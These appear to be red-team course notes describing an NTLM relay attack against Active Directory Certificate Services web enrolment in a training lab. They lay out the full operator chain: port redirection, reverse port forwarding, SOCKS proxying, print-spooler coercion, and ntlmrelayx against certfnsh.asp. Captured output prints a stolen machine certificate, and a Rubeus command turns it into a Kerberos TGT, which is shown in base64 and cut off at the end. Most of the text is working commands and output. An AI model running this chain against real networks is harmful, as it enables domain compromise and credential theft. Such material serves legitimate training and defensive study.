

AD CS services support HTTP enrolment methods and even includes a GUI.  This endpoint is usually found at location below
![[Pasted image 20231211164041.png]]
If NTLM authentication is enabled, these endpoints are vulnerable to NTLM relay attacks.  A common abuse method is to coerce a domain controller to authenticate to an attacker-controlled location, relay the request to a CA to obtain a certificate for that DC, and then use it to obtain a TGT.

An important aspect to be aware of is that you cannot relay NTLM authentication back to the originating machine.  We therefore wouldn't be able to relay a DC to a CA if those services were running on the same machine.  This is indeed the case in the RTO lab, as each CA is running on a DC.

Another good way to abuse this primitive is by gaining access to a machine configured for unconstrained delegation.

*We already have access to WEB as jking, but this is another way of achieving the same end.*


To achieve this, we need:

- PortBender on Workstation 2 to capture traffic on port 445 and redirect it to port 8445.
- A reverse port forward to forward traffic hitting port 8445 to the team server on port 445.
- A SOCKS proxy for ntlmrelayx to send traffic back into the network.

on `wkstn-2` as `bfarmer` `connect localhost 4444` to become `SYSTEM` in order to utilize `portbender`
```powershell
beacon> PortBender redirect 445 8445
[+] Launching PortBender module using reflective DLL injection
Initializing PortBender in redirector mode
Configuring redirection of connections targeting 445/TCP to 8445/TCP

```
`rportfwd` from `8445` on `WKSTN-2` to `445` on `127.0.0.1` which is the `teams server`
```powershell
[12/11 21:48:12] beacon> rportfwd 8445 127.0.0.1 445
[12/11 21:48:12] [+] started reverse port forward on 8445 to 127.0.0.1:445
[12/11 21:48:12] [*] Tasked beacon to forward port 8445 to 127.0.0.1:445
[12/11 21:48:12] [+] host called home, sent: 10 bytes
```
`socks5` proxy setup on `system` `WKSTN-2
![[Pasted image 20231211165024.png]]
The ntlmrelayx command needs to target the `certfnsh.asp` page on the ADCS server.
![[Pasted image 20231211165237.png]]
Then force the authentication to occur from WEB to WKSTN-2 from `SYSTEM` user on `WEB`
```powershell
beacon> execute-assembly C:\Tools\SharpSystemTriggers\SharpSpoolTrigger\bin\Release\SharpSpoolTrigger.exe 10.10.122.30 10.10.123.102
```

```powershell
attacker@ubuntu ~> sudo proxychains ntlmrelayx.py -t https://10.10.122.10/certsrv/certfnsh.asp -smb2support --adcs --no-
http-server
ProxyChains-3.1 (http://proxychains.sf.net)
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Protocol Client IMAP loaded..
[*] Protocol Client IMAPS loaded..
[*] Protocol Client DCSYNC loaded..
[*] Protocol Client MSSQL loaded..
[*] Protocol Client LDAP loaded..
[*] Protocol Client LDAPS loaded..
[*] Protocol Client SMTP loaded..
[*] Protocol Client SMB loaded..
[*] Protocol Client HTTPS loaded..
[*] Protocol Client HTTP loaded..
[*] Protocol Client RPC loaded..
[*] Running in relay mode to single host
[*] Setting up SMB Server
[*] Setting up WCF Server
[*] Setting up RAW Server on port 6666

[*] Servers started, waiting for connections
[*] SMBD-Thread-4: Received connection from 127.0.0.1, attacking target https://10.10.122.10
|S-chain|-<>-127.0.0.1:1080-<><>-10.10.122.10:443-<><>-OK
[*] HTTP server returned error code 200, treating as a successful login
[*] Authenticating against https://10.10.122.10 as DEV/WEB$ SUCCEED
[*] Generating CSR...
[*] CSR generated!
[*] Getting certificate...
[*] SMBD-Thread-6: Connection from 127.0.0.1 controlled, but there are no more targets left!
[*] SMBD-Thread-7: Connection from 127.0.0.1 controlled, but there are no more targets left!
[*] GOT CERTIFICATE! ID 26
[*] Base64 certificate of user WEB$:
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
```
The [[6. S4U2SELF Abuse]] trick can be used to obtain usable TGS's to move laterally to it.

*`certificate` to `tgt` example*
with the `certificate` above utilize `Rubeus asktgt` to generate an actual `TGT`
```powershell
[12/11 22:12:33] beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:WEB$ /certificate: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 /nowrap
[12/11 22:12:39] [+] received output:

   ______        _                      
  (_____ \      | |                     
   _____) )_   _| |__  _____ _   _  ___ 
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.1.2 

[*] Action: Ask TGT


[12/11 22:12:39] [+] received output:
[*] Using PKINIT with etype rc4_hmac and subject: CN=web.dev.cyberbotic.io 
[*] Building AS-REQ (w/ PKINIT preauth) for: 'dev.cyberbotic.io\WEB$'
[*] Using domain controller: 10.10.122.10:88

[12/11 22:12:39] [+] received output:
[+] TGT request successful!

[12/11 22:12:40] [+] received output:
[*] base64(ticket.kirbi):

      doIGEDCCBgygAwIBBaEDAgEWooIFGjCCBRZhggUSMIIFDqADAgEFoRMbEURFVi5DWUJFUkJPVElDLklPoiYwJKADAgECoR0wGxsGa3JidGd0GxFkZXYuY3liZXJib3RpYy5pb6OCBMgwggTEoAMCARKhAwIBAqKCBLYEggSyQpyXaSI7mCF62n9UwJBqwA2lRtGd5a4WVs/ho3sC3E3l6ONGW6cwJy1UmHPwgQ9p9uqATcDRh2ryyu6OWxVwfo/iZh3rVDNJbfY2DHJ0fnh4BuVW7emHBPTkv8v/Xv6+75GVQPKiVuLBZ2nZCm1RIiJHrXpgoQ7SAM9sJAzuBAFT2MVU1liUOK5ETUgCJpCMx++AyI4R7gVfBj/Ev/l4nVpEckDRgQj1zSHKJyotEOukge6y7JMFodvpErU7cRIwvSIyUcj7bX141WBdydkdAU71kDNsvoYrJezMSG+3A6hX4fI/bn+2N8z2t8Cga93cdUeg8jo68H2DOvEL8C0FD5ywSPo78Ko5Jz3jyRHeWMJYHX5Sa0Q3ZYFtC4tTGQW6d0miJI3axK24ZRZKzsG76vLOl3ezJlHtnM43IzmWCrQIkQe4kEJHJifLd3aUbPsGyP/C0MM7K+/EQEdOdG05k4SJEEJPAr8eABlj8yzzciN6PUMq+V2x3Mw9k9aS2U57sj96LFijCdKKOCZzf09gt8cFYrHr9oTi6Nq63HoayrGzxh/ENYoew27RJ6AtuLWrpy0kSpkZb2psWVajCUgfpUe13IPQOTwU3a8r0Q417BBovoPdcOSPXgSS77+Km/PS8Wc+esiVqLK9DwILKSrMtI5d8gNIiVqXgH0+d6uL2t5NYfGwlRmn1xNl050ofgjui8wRjJ6NpH4L7Z2gSSQSg7iKYmNhlCqL3nM0qjkaBnoWaBcUGqOxq9JecUnwnadatqri/USOjD3X+4au5jx8oXN8Ln+zEYFQSZDD7J+bsC1aKasnFtPJhg2d77pzNSadloEBSN7kGaAQ16laN+kL5VslPNu/jpRJ/QWhbDP2uWYoH5iJYCe9BqnBD7kPJWcDhseOzfMybyzMsMZSetOrY1pI4FJL4RkBoHjHr5fnPjOyjSeYfFP2p7swgWdat9rD3O8QsrGqDII3zPQDiz3Q2AaYqg86YrwU+xnfYmmhC2uiIWy6CqOzeqZNDJU1eGzDyeD4MzwaEXImCHh1kzZuZu2Y+PoGC9lEQ9ZyL6kYerFRnb1FNX82O6dRNvee3c6dNIPns8ZpgB6CbduEODaavpGyQ5B1eTeHD1Kb7CkbxTorAZGwWzzBgLRVPtxEvf19uEP5+oz6xQQ4I/zEHZp/EohGRjfCdMQZb5gw9JxTj1RPJj1fdkMArKtLEoyKFCX43hbVk6m8o+0oXpA710+eGkoQ4qRPW2g422sf4rZK3OnRb4GHYZH75OU98G2PkLPYWpyGbAr3u+aly/NGzPqqlPJMv3aqIKZ+Sysa93BilkBm8wEI1N6MhqlRa4xAwtW3Aex2Ub1HwxiPMZFl/ZyxUAUF8EQt5clKuNIxasNngtZ2b4WwO9KmeZyB49v1HWYe1SlQW+e9bXuvV8EOUG5y8+RzGf/JDgwKkmGs3z3I6shxFLje+JD3gl4xjl3gwonNpPstJ9i+74ntgrtx+XxVgHqaHUAqn5nAYGaaKIPyIcJf